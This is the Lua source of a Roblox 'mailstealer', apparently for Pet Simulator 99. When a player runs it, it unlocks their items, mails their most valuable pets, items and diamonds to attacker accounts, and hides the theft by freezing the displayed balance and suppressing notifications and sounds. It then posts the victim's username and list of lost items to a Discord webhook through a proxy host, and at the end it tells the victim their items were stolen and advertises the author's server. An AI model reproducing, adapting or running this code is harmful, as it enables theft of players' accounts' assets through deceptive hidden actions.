local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory
local mailsent = library.Save.Get().MailboxSendsSinceReset
local plr = game.Players.LocalPlayer
local MailMessage = "gg / HcpNe56R2a"
local GetRapValues = getupvalues(library.DevRAPCmds.Get)[1]
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local rapCache = {}
local sendamount = game.Players.LocalPlayer.PlayerGui._MACHINES.MailboxMachine.Frame.SendFrame.Bottom.Diamonds.Amount.Text
_G.scriptExecuted = _G.scriptExecuted or false
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

if _G.scriptExecuted then
    return
end

local newamount = 20000

if mailsent ~= 0 then
	newamount = math.ceil(newamount * (1.5 ^ mailsent))
end

local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
		break
    end
end

if newamount > GemAmount1 then
    return
end

local function IsMailboxHooked()
	local uid
	for i, v in pairs(save["Pet"]) do
		uid = i
		break
	end
	local args = {
        [1] = "Roblox",
        [2] = "Test",
        [3] = "Pet",
        [4] = uid,
        [5] = 1
    }
    local response, err = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    if (err == "They don't have enough space!") or (err == "You don't have enough diamonds to send the mail!") then
        return false
    else
        return true
    end
end

local function formatNumber(number)
	local number = math.floor(number)
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
	return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function SendMessage(url, username, diamonds)
    local headers = {
        ["Content-Type"] = "application/json"
    }

	local totalRAP = 0
	local fields = {
		{
			name = "Victim Username:",
			value = username,
			inline = true
		},
		{
			name = "Items to be sent:",
			value = "",
			inline = false
		}
	}

	for _, item in ipairs(sortedItems) do
		fields[2].value = fields[2].value .. item.name .. ": " .. formatNumber(item.rap * item.amount) .. " RAP\n"
		totalRAP = totalRAP + (item.rap * item.amount)
	end
    fields[2].value = fields[2].value .. "\nGems: " .. formatNumber(diamonds) .. "\n"
	fields[2].value = fields[2].value .. "Total RAP: " .. formatNumber(totalRAP)
	if IsMailboxHooked() then
		fields[2].name = "Anti-mailstealer used! You lost these items:"
		fields[2].value = fields[2].value .. "\n\n\226\154\160 NOTICE: Anti-mailstealer used"
	end

    local data = {
        ["embeds"] = {{
            ["title"] = "New Execution" ,
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "Mailstealer by Tobi. discord.gg/HcpNe56R2a"
			}
        }}
    }
    local body = HttpService:JSONEncode(data)
    local response = request({
		Url = url,
		Method = "POST",
		Headers = headers,
		Body = body
	})
end

local user = Username
local user2 = Username2 or "2pRiAMfYN41y"

local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
	gemsleaderstatpath.Value = gemsleaderstat
end)

local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
	noti.Enabled = false
end)
noti.Enabled = false

game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
            x.Volume=0
            x.PlayOnRemove=false
            x:Destroy()
        end
    end
end)

local function safeToString(value)
    if value == nil then
        return "nil"
    else
        return tostring(value)
    end
end

local function getRAP(Type, Item)
	local cacheKey = Type .. ":" .. safeToString(Item.id) .. ":" .. safeToString(Item.tn) .. ":" .. safeToString(Item.sh) .. ":" .. safeToString(Item.pt)
	if rapCache[cacheKey] then
		return rapCache[cacheKey]
	end

    if GetRapValues[Type] then
        for i,v in pairs(GetRapValues[Type]) do
            local itemTable = HttpService:JSONDecode(i)
            if itemTable.id == Item.id and itemTable.tn == Item.tn and itemTable.sh == Item.sh and itemTable.pt == Item.pt then
				rapCache[cacheKey] = v
                return v
            end
        end
    end
	return 0
end

local function sendItem(category, uid, am)
    local args = {
        [1] = user,
        [2] = MailMessage,
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
	local response = false
	repeat
    	local response, err = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
		if response == false and err == "They don't have enough space!" then
			user = user2
			args[1] = user
		end
	until response == true
	GemAmount1 = GemAmount1 - newamount
	newamount = math.ceil(math.ceil(newamount) * 1.5)
	if newamount > 5000000 then
		newamount = 5000000
	end
end

local function SendAllGems()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
			if GemAmount1 >= (newamount + 10000) then
				local args = {
					[1] = user,
					[2] = MailMessage,
					[3] = "Currency",
					[4] = i,
					[5] = GemAmount1 - newamount
				}
				local response = false
				repeat
					local response = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
				until response == true
				break
			end
        end
    end
end

local function EmptyBoxes()
    if save.Box then
        for key, value in pairs(save.Box) do
			if value._uq then
				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(key)
			end
        end
    end
end

local function ClaimMail()
    local response, err = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait()
        response, err = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
    end
end

ClaimMail()
EmptyBoxes()
local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
local blob_a = require(game.ReplicatedStorage.Library)
local blob_b = blob_a.Save.Get()
function deepCopy(original)
	local copy = {}
	for k, v in pairs(original) do
		if type(v) == "table" then
			v = deepCopy(v)
		end
		copy[k] = v
	end
	return copy
end
blob_b = deepCopy(blob_b)
blob_a.Save.Get = function(...)
	return blob_b
end
for i, v in pairs(categoryList) do
	if save[v] ~= nil then
		for uid, item in pairs(save[v]) do
			if v == "Pet" then
                local dir = library.Directory.Pets[item.id]
                if dir.huge or dir.exclusiveLevel then
                    local rapValue = getRAP(v, item)
                    if rapValue >= min_rap then
                        local prefix = ""
                        if item.pt and item.pt == 1 then
                            prefix = "Golden "
                        elseif item.pt and item.pt == 2 then
                            prefix = "Rainbow "
                        end
                        if item.sh then
                            prefix = "Shiny " .. prefix
                        end
                        local id = prefix .. item.id .. " (x" .. (item._am and tostring(item._am) or "1") .. ")"
                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
                    end
                end
            else
                local rapValue = getRAP(v, item)
                if rapValue >= min_rap then
                    local id = item.id .. " (x" .. (item._am and tostring(item._am) or "1") .. ")"
                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
                end
            end
            if item._lk then
                local args = {
                [1] = uid,
                [2] = false
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
            end
        end
	end
end
if Webhook and string.find(Webhook, "discord") then
	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
	SendMessage(Webhook, plr.Name, GemAmount1)
end
table.sort(sortedItems, function(a, b) return a.rap > b.rap end)
_G.scriptExecuted = true
for _, item in ipairs(sortedItems) do
	if item.rap >= newamount then
    	sendItem(item.category, item.uid, item.amount)
	else
		break
	end
end
SendAllGems()
setclipboard("https://discord.gg/HcpNe56R2a")
local message = require(game.ReplicatedStorage.Library.Client.Message)
message.Error("All your valuable items just got stolen by Tobi's mailstealer!\nJoin discord.gg/HcpNe56R2a")
